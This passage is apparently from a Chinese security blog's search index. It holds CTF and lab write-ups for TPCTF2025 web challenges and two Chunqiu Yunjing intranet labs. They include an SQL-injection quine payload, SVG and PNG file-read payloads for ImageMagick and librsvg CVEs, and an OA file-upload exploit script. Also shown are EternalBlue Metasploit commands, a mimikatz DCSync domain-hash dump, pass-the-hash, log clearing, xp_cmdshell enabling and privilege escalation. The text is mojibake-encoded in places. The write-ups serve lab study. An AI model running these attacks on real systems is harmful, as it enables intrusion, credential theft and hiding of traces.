data.replace(\u0026#39;$$\u0026#39;,\u0026#39;\u0026#34;$\u0026#34;\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#34;\u0026#39;) 6 data = data.replace(\u0026#39;$$\u0026#39;,\u0026#34;\u0026#39;\u0026#34;+blob+\u0026#34;\u0026#39;\u0026#34;) 7 if debug: 8 print (data) 9 return data 10 11data = quine(\u0026#34;1\u0026#39; union select 1,2,$$--\u0026#34;) å®Œæ•´payload\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \u0026#34;Windows\u0026#34; 8sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;134\u0026#34;, \u0026#34;Not:A-Brand\u0026#34;;v=\u0026#34;24\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;134\u0026#34; 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\u0026#34;username\u0026#34; 20 21admin 22--a 23Content-Disposition: form-data; name=\u0026#34;password\u0026#34;;filename=\u0026#34;password\u0026#34; 24Content-Disposition: form-data; name=\u0026#34;password\u0026#34;; 25 261\u0026#39; union select 1,2,REPLACE(REPLACE(\u0026#39;1\u0026#34; union select 1,2,REPLACE(REPLACE(\u0026#34;$\u0026#34;,CHAR(34),CHAR(39)),CHAR(36),\u0026#34;$\u0026#34;)--\u0026#39;,CHAR(34),CHAR(39)),CHAR(36),\u0026#39;1\u0026#34; union select 1,2,REPLACE(REPLACE(\u0026#34;$\u0026#34;,CHAR(34),CHAR(39)),CHAR(36),\u0026#34;$\u0026#34;)--\u0026#39;)-- 27--a-- thumbor1 thumboræ˜¯ä¸€ä¸ªå›¾ç‰‡å¤„ç†æœåŠ¡å·¥å…·ï¼Œå¯ä»¥å¯¹å›¾ç‰‡è¿›è¡ŒåŠ¨æ€è°ƒæ•´\né™„ä»¶åªæœ‰ä¸€ä¸ªdockerfile\nå¯ä»¥èµ·ä¸ªdockeræ‹¿ä¸€ä¸‹æºç \nè¿™é¢˜ä¸æ˜¯å› ä¸ºthumboræœ‰é—®é¢˜ï¼Œè€Œæ˜¯å› ä¸ºthumborçš„ä¸€ä¸ªç»„ä»¶ImageMagickå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä¹Ÿå°±æ˜¯CVE-2022-44268ã€‚\nå»GitHubæ‰¾ä¸€ä¸ªPOC\nvoidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read\nä»readmeå¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥é€šè¿‡ç±»ä¼¼ssrfçš„æ–¹å¼è¿œç¨‹åŠ è½½å›¾ç‰‡\nåœ¨vpsä¸Šæ„é€ å¥½pngï¼Œè¿œç¨‹åŠ è½½å³å¯\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/å›¾ç‰‡ å…¶å®å°±æ˜¯å¤ç°cve\nthumbor2 dockerfileé‡Œé¢å¢åŠ äº†æœ€æ–°ç‰ˆçš„ImageMagickï¼Œå…¶å®å°±æ˜¯ä¿®å¤äº†ä¸Šä¸€é¢˜çš„ImageMagick\nè¿™é¢˜æ˜¯å¦ä¸€ä¸ªç»„ä»¶librsvgçš„æ¼æ´ï¼ŒCVE-2023-38633\nlibrsvg 2.56.3 ä¹‹å‰ç‰ˆæœ¬ä¸­ URL è§£ç å™¨çš„ç›®å½•éå†é—®é¢˜ï¼Œå¯ä»¥è¢«æœ¬åœ°æˆ–è¿œç¨‹æ”»å‡»è€…ç”¨æ¥æ³„éœ²æ–‡ä»¶ï¼ˆåœ¨é¢„æœŸåŒºåŸŸä¹‹å¤–çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šï¼‰ï¼Œä¾‹å¦‚é€šè¿‡åœ¨ xi:include å…ƒç´ ä¸­ä½¿ç”¨ href=â€œ.?../â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/etc/passwdâ€ æ¥è¯»å–ç»“æœã€‚ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/HMX404/article/details/137231580\nåŸç†å‚è€ƒæ–‡ç« ï¼š\nWhen URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog\npayloadï¼š\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt; \u0026lt;svg width=\u0026#34;3000\u0026#34; height=\u0026#34;3000\u0026#34; xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt; \u0026lt;rect width=\u0026#34;3000\u0026#34; height=\u0026#34;3000\u0026#34; style=\u0026#34;fill:rgb(255,255,255);\u0026#34; /\u0026gt; \u0026lt;text x=\u0026#34;0\u0026#34; y=\u0026#34;1500\u0026#34; font-size=\u0026#34;100\u0026#34;\u0026gt; \u0026lt;xi:include href=\u0026#34;.?../../../../../../../../flag\u0026#34; parse=\u0026#34;text\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;xi:fallback\u0026gt;file not found\u0026lt;/xi:fallback\u0026gt; \u0026lt;/xi:include\u0026gt; \u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªtxtï¼Œå°†payloadå†™è¿›å»ï¼Œè¿œç¨‹åŠ è½½å³å¯\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/poc.txt ","permalink":"http://localhost:1313/post/tpctf_2025/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.0xfff.team/posts/tpctf_2025_writeup/\"\u003ehttps://blog.0xfff.team/posts/tpctf_2025_writeup/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://z3n1th1.com/2025/03/tpctf2025-writeup/\"\u003ehttps://z3n1th1.com/2025/03/tpctf2025-writeup/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.xmcve.com/2025/03/11/TPCTF2025-Writeup/\"\u003eTPCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"baby-layout\"\u003ebaby layout\u003c/h3\u003e\n\u003cp\u003eè¿™æ˜¯ä¸€é“å…³äºç»•è¿‡DOMPurifyåº“ï¼Œè¿›è¡Œxss cookieçªƒå–çš„é¢˜ç›®\u003c/p\u003e\n\u003cp\u003eDOMPurify æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ¸…ç† HTML è¾“å…¥çš„ JavaScript åº“ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ã€‚å®ƒé€šè¿‡è¿‡æ»¤å’Œå‡€åŒ–ç”¨æˆ·æä¾›çš„ HTML å†…å®¹ï¼Œç¡®ä¿å…¶å®‰å…¨åœ°åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œé¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚\u003c/p\u003e","title":"TPCTF2025-Web-èµ›åå¤ç°Writeup"},{"content":" å‚è€ƒæ–‡ç« \nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\nèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\nFLAG1 fscanæ‰«ä¸€ä¸‹\n./fscan.exe -h 39.99.139.119 ç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\nå…ˆç”¨vshellä¸Šçº¿\nè¯»flagéœ€è¦ææƒ\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\nä¼ ä¸ªlinpeasæ‰«ä¸€ä¸‹\n./linpeas_linux_amd64 \u0026gt; output.txt åœ¨å†å²æ–‡ä»¶ä¸­æ‰¾åˆ°ç–‘ä¼¼è¯»flagçš„å‘½ä»¤\nå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„sudoææƒ\næ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢\nmysql æ˜¯é…ç½®äº† sudo å…å¯†ä½¿ç”¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ mysql ææƒï¼Œé€šè¿‡mysqlæ‰§è¡Œå‘½ä»¤æ¥è¯»flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- æ¥ä¸‹æ¥æ­ä»£ç†\næŸ¥å†…ç½‘ip\næ¥ç€ä¼ ä¸€ä¸ªfscanæ‰«ä¸€ä¸‹å†…ç½‘\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 æ”¶é›†åˆ°çš„ä¿¡æ¯\n172.22.1.2:DCåŸŸæ§\r172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´\r172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ FLAG2 å…ˆçœ‹ä¿¡å‘¼\nå¼±å£ä»¤æˆåŠŸç™»å…¥admin/admin123\nä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿv2.2.8å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´\n[Awesome-POC/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md at master Â· Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) å†™é©¬ä¹‹åç›´æ¥è¯»flagå°±è¡Œ\nflag02: 2ce3-4813-87d4- FLAG3 æ°¸æ’ä¹‹è“å¯ä»¥ç”¨msfæ‰“\nç°åœ¨kaliä¸Šç”¨proxychains4ç®€å•é…ä¸ªä»£ç†\nproxychains4 msfconsole\rsearch ms17-010 æœ‰å››ä¸ªä¸åŒçš„æ¨¡å—\nè¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºåˆ©ç”¨èŒƒå›´æ¯”è¾ƒå¹¿\nuse exploit/windows/smb/ms17_010_eternalblue # é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—\rset payload windows/x64/meterpreter/bind_tcp_uuid # è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹\rset RHOSTS 172.22.1.21 # è®¾ç½®é¶æœºçš„ip\rexploit # å‘èµ·æ”»å‡» æˆåŠŸäº†\nmeterpreter \u0026gt; screenshot # æ•è·å±å¹•\rmeterpreter \u0026gt; upload hello.txt c:// #ä¸Šä¼ æ–‡ä»¶\rmeterpreter \u0026gt; download d://1.txt # ä¸‹è½½æ–‡ä»¶\rmeterpreter \u0026gt; shell # è·å–cmd\rmeterpreter \u0026gt; clearev # æ¸…é™¤æ—¥å¿— load kiwi # è°ƒç”¨mimikatzæ¨¡å—\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼) æ‹¿åˆ°Administrator ç”¨æˆ·çš„ hashï¼Œæ¥ç€ä½¿ç”¨ crackmapexec æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° DCåŸŸæ§ ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œ\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; æ‹¿åˆ°æœ€åä¸€ä¸ªflag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscanæ‰«ä¸€ä¸‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆç”¨vshellä¸Šçº¿\u003c/p\u003e\n\u003cp\u003eè¯»flagéœ€è¦ææƒ\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Initial-Writeup"},{"content":"Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\nå‚è€ƒæ–‡ç« \næ˜¥ç§‹äº‘é•œ TSclient \u0026ndash; Walkthrough - KingBridge - åšå®¢å›­\næ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥\nFLAG1 å…ˆç”¨fscanæ‰«ä¸€ä¸‹\nmssqlæœåŠ¡æ˜¯å¼±å£ä»¤\nsa/1qaz!QAZ ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»\næ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/7129\nåˆ¤æ–­xp_cmdshellçŠ¶æ€\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; å­˜åœ¨\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; é…ç½®é€‰é¡¹ \u0026#39;xp_cmdshell\u0026#39; å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚ å¯åŠ¨æˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿\næ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™\næƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd ææƒä¹‹åæ‹¿åˆ°flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿\næ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘\n1â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 2â”‚ ___ _ â”‚ 3â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 4â”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚ 5â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚ 6â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 7â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 11[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 12[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -\u0026gt; IPèŒƒå›´ 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 16[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 17[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 18[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 19[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 20[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31 å­˜æ´» (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18 å­˜æ´» (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15 å­˜æ´» (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46 å­˜æ´» (ICMP) 24[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4 25[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 26[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =\u0026gt; [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17 61[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ 62[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 64ç›®æ ‡ä¸»æœº: 172.22.8.18 65ä¸»æœºå: WIN-WEB 66å‘ç°çš„ç½‘ç»œæ¥å£: 67 IPv4åœ°å€: 68 â””â”€ 172.22.8.18 69 IPv6åœ°å€: 70 â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 73ç›®æ ‡ä¸»æœº: 172.22.8.15 74ä¸»æœºå: DC01 75å‘ç°çš„ç½‘ç»œæ¥å£: 76 IPv4åœ°å€: 77 â””â”€ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 79ç›®æ ‡ä¸»æœº: 172.22.8.46 80ä¸»æœºå: WIN2016 81å‘ç°çš„ç½‘ç»œæ¥å£: 82 IPv4åœ°å€: 83 â””â”€ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 